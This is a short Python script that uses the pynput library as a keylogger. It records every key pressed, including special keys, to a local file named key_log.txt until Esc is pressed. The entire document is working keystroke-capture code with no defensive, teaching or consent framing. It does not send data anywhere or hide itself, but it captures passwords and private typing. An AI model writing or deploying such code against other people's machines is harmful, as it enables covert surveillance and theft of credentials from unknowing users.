from pynput.keyboard import Key, Listener

# File to store the logged keys
log_file = "key_log.txt"

def on_press(key):
    # Convert key to string and write it to the log file
    with open(log_file, "a") as f:
        try:
            f.write(str(key.char))  # Log alphanumeric keys
        except AttributeError:
            if key == Key.space:
                f.write(' ')  # Log space key as a space
            else:
                f.write(f'[{key}]')  # Log special keys

def on_release(key):
    # Stop listener if 'esc' is pressed
    if key == Key.esc:
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
